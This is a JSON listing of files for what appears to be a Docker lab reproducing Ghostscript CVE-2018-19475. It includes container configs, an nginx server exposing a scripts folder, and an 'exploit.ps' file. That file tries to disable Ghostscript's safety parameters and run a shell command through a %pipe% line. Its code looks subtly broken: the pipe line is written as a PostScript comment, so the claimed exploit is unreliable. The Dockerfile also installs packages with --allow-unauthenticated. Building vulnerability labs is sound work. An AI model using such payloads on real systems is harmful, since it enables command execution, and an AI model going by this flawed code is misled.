{
    "files": [
        {
            "location": "./../../dockers/CVE-2018-19475/custom_no_tool/docker-compose.yml",
            "content": "services:\n  ghostscript:\n    image: debian:10\n    container_name: ghostscript_vulnerable\n    build:\n      context: ./ghostscript\n    volumes:\n      - ./scripts:/scripts\n    command: [\"/bin/bash\", \"-c\", \"tail -f /dev/null\"]\n\n  nginx:\n    image: nginx:1.21.3\n    container_name: nginx_server\n    volumes:\n      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf\n      - ./scripts:/usr/share/nginx/html/scripts\n    ports:\n      - \"80:80\"\n    depends_on:\n      - ghostscript\n\nnetworks:\n  default:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2018-19475/custom_no_tool/nginx/default.conf",
            "content": "server {\n    listen 80;\n    server_name localhost;\n\n    location / {\n        root /usr/share/nginx/html;\n        index index.html;\n    }\n\n    location /scripts/ {\n        alias /usr/share/nginx/html/scripts/;\n        autoindex on;\n    }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2018-19475/custom_no_tool/ghostscript/Dockerfile",
            "content": "FROM debian:10\n\n# Install necessary packages for building Ghostscript and Python3\nRUN echo \"deb http://archive.debian.org/debian buster main\" > /etc/apt/sources.list && \\\n    echo \"deb http://archive.debian.org/debian-security buster/updates main\" >> /etc/apt/sources.list && \\\n    apt-get update -o Acquire::Check-Valid-Until=false && \\\n    apt-get install -y --allow-unauthenticated wget build-essential python3 && \\\n    apt-get install -y --allow-unauthenticated libx11-dev libtiff5-dev libpng-dev && \\\n    wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs925/ghostscript-9.25-linux-x86_64.tgz && \\\n    tar -xzf ghostscript-9.25-linux-x86_64.tgz && \\\n    mv ghostscript-9.25-linux-x86_64/gs-925-linux-x86_64 /usr/local/bin/gs && \\\n    rm -rf ghostscript-9.25-linux-x86_64.tgz ghostscript-9.25-linux-x86_64\n\nCOPY entrypoint.sh /entrypoint.sh\nRUN chmod +x /entrypoint.sh\n\nENTRYPOINT [\"/entrypoint.sh\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-19475/custom_no_tool/ghostscript/entrypoint.sh",
            "content": "#!/bin/bash\n\n# Start a simple HTTP server to serve scripts\npython3 -m http.server 8000 --directory /scripts &\n\n# Keep the container running\nexec \"$@\"\n"
        },
        {
            "location": "./../../dockers/CVE-2018-19475/custom_no_tool/scripts/exploit.ps",
            "content": "%!PS\n% Exploit script for CVE-2018-19475\n% This PostScript file will attempt to execute a shell command using the vulnerability\n\nuserdict begin\n  /tmpstr 256 string def\n  /systemdict/currentuserparams get dup length dict copy def\n  /LockSafetyParams false put\n  /currentuserparams exch def\nend\n\n% Attempt to execute a shell command\n%pipe% /bin/sh -c \"echo 'Vulnerable to CVE-2018-19475' > /scripts/vulnerable.txt\" %pipe%\n\nshowpage\n"
        }
    ],
    "directory_tree": "CVE-2018-19475/\n\u251c\u2500\u2500 custom_no_tool\n\u2502   \u251c\u2500\u2500 docker-compose.yml\n\u2502   \u251c\u2500\u2500 ghostscript\n\u2502   \u2502   \u251c\u2500\u2500 Dockerfile\n\u2502   \u2502   \u2514\u2500\u2500 entrypoint.sh\n\u2502   \u251c\u2500\u2500 nginx\n\u2502   \u2502   \u2514\u2500\u2500 default.conf\n\u2502   \u2514\u2500\u2500 scripts\n\u2502       \u2514\u2500\u2500 exploit.ps\n"
}